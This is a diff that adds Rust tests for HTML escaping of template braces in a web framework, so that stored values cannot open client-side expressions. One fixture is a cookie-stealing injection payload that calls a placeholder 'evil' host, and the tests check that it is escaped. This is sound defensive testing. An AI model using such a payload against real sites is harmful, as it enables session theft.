@@ -294,3 +294,78 @@ fn a_page_is_marked_for_the_layout_layers() {
     let res = Html::from_raw("<p>x</p>".to_string()).into_response();
     assert!(res.extensions().get::<PageBody>().is_some());
 }
+
+// ------------------------------------------------------- PulsePoint braces
+
+/// PulsePoint compiles the rendered page, and braces are not HTML-special: a
+/// value's `{…}` would arrive as an expression the browser evaluates. Each
+/// brace is written as a character reference instead, in text and in
+/// attributes.
+#[test]
+fn a_value_cannot_open_a_pulsepoint_expression() {
+    let stored = "{fetch('//evil/' + document.cookie)}";
+    assert_eq!(
+        text(&stored),
+        "&#123;fetch('//evil/' + document.cookie)&#125;"
+    );
+    assert_eq!(
+        attr(&stored),
+        "&#123;fetch(&#39;//evil/&#39; + document.cookie)&#125;"
+    );
+    assert_eq!(Html::escape("{x}").as_str(), "&#123;x&#125;");
+}
+
+/// `Html::from_raw` is the trust boundary: markup built through it keeps its
+/// braces live, the way an authored `{…}` binding does.
+#[test]
+fn trusted_markup_keeps_its_bindings() {
+    assert_eq!(
+        text(&Html::from_raw("<b>{count}</b>".into())),
+        "<b>{count}</b>"
+    );
+}
+
+fn deferred(markup: &str) -> String {
+    let mut out = String::new();
+    render_deferred_children(&Html::from_raw(markup.into()), &mut out);
+    out
+}
+
+/// Inside the root layout's deferred template a single-layer reference is
+/// raised one layer, so the browser's parse leaves `&#123;` for the runtime
+/// to render as a brace.
+#[test]
+fn deferred_children_raise_every_single_layer_brace_reference() {
+    assert_eq!(
+        deferred("<p>&#123;x&#125;</p>"),
+        "<p>&amp;#123;x&amp;#125;</p>"
+    );
+    assert_eq!(
+        deferred("<i title=\"&#X7B;&lbrace;&RBRACE;&#x7d;\"></i>"),
+        "<i title=\"&amp;#X7B;&amp;lbrace;&amp;RBRACE;&amp;#x7d;\"></i>"
+    );
+}
+
+/// What `html!` already doubled, other references, and live bindings pass
+/// through unchanged.
+#[test]
+fn deferred_children_leave_everything_else_alone() {
+    let markup = "<p>&amp;#123;a&amp;#125; &amp; &lt;b&gt; &#160; {count} &#1234;</p>";
+    assert_eq!(deferred(markup), markup);
+}
+
+/// Script and style bodies are raw text the browser never decodes, so a
+/// reference there is source and stays as written.
+#[test]
+fn deferred_children_skip_raw_text_elements() {
+    let markup = "<script>const s = \"&#123;\";</script><STYLE>a::after{content:\"&#125;\"}</STYLE><p>&#123;</p>";
+    assert_eq!(
+        deferred(markup),
+        "<script>const s = \"&#123;\";</script><STYLE>a::after{content:\"&#125;\"}</STYLE><p>&amp;#123;</p>"
+    );
+    assert_eq!(
+        deferred("<scripted>&#123;</scripted>"),
+        "<scripted>&amp;#123;</scripted>"
+    );
+    assert_eq!(deferred("<script>&#123;"), "<script>&#123;");
+}
